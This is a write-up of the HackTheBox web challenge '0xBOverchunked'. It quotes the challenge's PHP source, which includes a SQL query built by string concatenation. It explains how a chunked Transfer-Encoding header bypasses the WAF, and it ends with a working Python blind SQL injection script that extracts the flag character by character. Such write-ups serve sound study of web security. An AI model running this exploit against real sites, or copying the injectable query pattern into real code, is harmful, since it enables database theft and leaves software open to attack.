---
title: Hackthebox Challenge - 0xBOverchunked
date: 2024-02-28
categories: [Writeups, Hackthebox Challenge]
tags: [CTF, Web, easy]
---

# 0xBOverchunked - EASY

## Description

<Sup>Author: @dhmosfunk</sup><br>
Are you able to retrieve the 6th character from the database?

## Solution

![img-description](/assets/img/2024-02-28-0xBOverchunked/website.png)
**After start machine I see a website with a searching page.**

But nothing even I can search id from 1 to 5 but id 6 is not allowed.

`Let's see the source code of the page.`

**index.php**

```html
<script>
  $(document).ready(function () {
    $("#search-form").submit(function (event) {
      event.preventDefault();
      var searchValue = $("input[name=search]").val();
      $.ajax({
        url: "Controllers/Handlers/SearchHandler.php",
        method: "post",
        data: { search: searchValue },
        success: function (response) {
          $("#results").html(response);
        },
      });
    });
  });
</script>
```

```php
<?php
require_once '../Database/Cursor.php';
require_once '../WAF/waf.php';

if (isset($_SERVER["HTTP_TRANSFER_ENCODING"]) && $_SERVER["HTTP_TRANSFER_ENCODING"] == "chunked")
{
    $search = $_POST['search'];

    $result = unsafequery($pdo, $search);

    if ($result)
    {
        echo "<div class='results'>No post id found.</div>";
    }
    else
    {
        http_response_code(500);
        echo "Internal Server Error";
        exit();
    }

}
else
{
    if ((isset($_POST["search"])))
    {
        $search = $_POST["search"];
        if (waf_sql_injection($search))
        {
            // // <SNIP>
        }
        else
            // <SNIP>
    }
    else
    {
        echo "<div class='results'>Unsupported method!</div>";
        http_response_code(400);
    }

}

?>
```

**Cursor.php**

```php
<?php
require_once 'Connect.php';

function safequery($pdo, $id)
{
    if ($id == 6)
    {
        die("You are not allowed to view this post!");
    }

    $stmt = $pdo->prepare("SELECT id, gamename, gamedesc, image FROM posts  WHERE id = ?");
    $stmt->execute([$id]);

    $result = $stmt->fetch(PDO::FETCH_ASSOC);

    return $result;
}

function unsafequery($pdo, $id)
{
    try
    {
        $stmt = $pdo->query("SELECT id, gamename, gamedesc, image FROM posts WHERE id = '$id'");
        $result = $stmt->fetch(PDO::FETCH_ASSOC);
        return $result;
    }
    catch(Exception $e)
    {
        http_response_code(500);
        echo "Internal Server Error";
        exit();
    }
}

?>
```

in the `index.php` I see after click on search button it will send a request to `SearchHandler.php` with the value of the search input.

### Concept of Chunked Transfer Encoding

After analyzing the source code I see that the server is checking for `HTTP_TRANSFER_ENCODING` and if it is `chunked` then it will execute function unsafequery.

The first vuln I aim to exploit is `Request Smuggling` it working but if you see into source code I can use unsavequery to query id 6 but they always send data back with.

````php
echo "
<div class="results">No post id found.</div>
";```
````

That mean I need to use `Blind SQL Injection` to get the flag.

But in that point I don't know how to do it because I don't know about `Transfer-Encoding: chunked` so I search on google and I found a good article about it.

[https://sc.scomurr.com/http-request-smuggling-te-cl-vulnerability/](https://sc.scomurr.com/http-request-smuggling-te-cl-vulnerability/)

After learn about it I know that I can use `Transfer-Encoding: chunked` to bypass the WAF and get the flag.

### Exploit

```python
import requests
import string

possible = string.ascii_letters + string.digits + string.punctuation + ' '

url = input('Enter the URL: ')
path = '/Controllers/Handlers/SearchHandler.php'

headers = {
    'Content-Type': 'application/x-www-form-urlencoded',
    'Transfer-Encoding': 'chunked'
}
ERROR_MSG = "Internal Server Error"

flag = "HTB"
while flag[-1] != '}':
    for i in possible:
        print(f'Test {i}',end='\r')
        query_data = f"search=1' and (select substr(gamedesc,{len(flag)+1},1) from posts where id='6')='{i}'--"
        hex_len = hex(len(query_data))[2:]
        header_data = f'{hex_len}\r\n'
        end_data = '0\r\n'

        data = header_data + query_data + end_data
        response = requests.post(url, headers=headers, data=data)

        if ERROR_MSG not in response.text:
            flag += i
            print(flag)
            break
```

> {: .prompt-tip }
